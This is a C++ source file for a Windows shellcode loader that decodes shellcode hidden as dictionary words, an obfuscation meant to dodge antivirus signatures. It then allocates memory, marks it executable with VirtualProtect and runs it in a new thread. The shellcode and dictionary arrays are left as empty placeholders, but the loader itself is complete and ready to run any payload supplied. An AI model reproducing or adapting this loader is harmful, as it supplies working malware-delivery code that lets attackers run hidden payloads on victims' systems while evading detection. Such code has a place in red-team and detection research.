/*
CPP Diction Shellcode Program

Start Visual Studio command-line tools
Compile: .\compile.bat

*/
#include <windows.h>

// Shellcode translation dictionary
unsigned char* translate_dict[256] = { }; // SHELLCODE DICTIONARY GOES HERE

// Shellcode in Dictionary words format -> SUB YOUR SHELLCODE OUTPUT HERE AND UPDATE LENGTH
const char* dict_words[LENGTH] = { };

int main(void) 
{    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	// Converted shellcode placeholder
	unsigned char shellcode[276];	// UPDATE: This MUST be same length as above dict_words array
	unsigned int shellcode_len = sizeof(shellcode);

    // Decode shellcode using input Dictionary wordlist "translate_dict"
    for (int sc_index = 0; sc_index < shellcode_len; sc_index++) // Loop through shellcode words first
    {
        for (int dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
        {
            // If the word was found in the shellcode Dictionary
            if (strcmp(translate_dict[dict_index], dict_words[sc_index]) == 0 ) {
                // Convert shellcode to byte and add to output variable
                shellcode[sc_index] = dict_index;
                break;
            }
        }
    }

	// Allocate space
	exec_mem = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy shellcode to buffer
	RtlMoveMemory(exec_mem, shellcode, shellcode_len);
	
	// Change protections
	rv = VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &oldprotect);

	// Execute
	if ( rv != 0 ) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
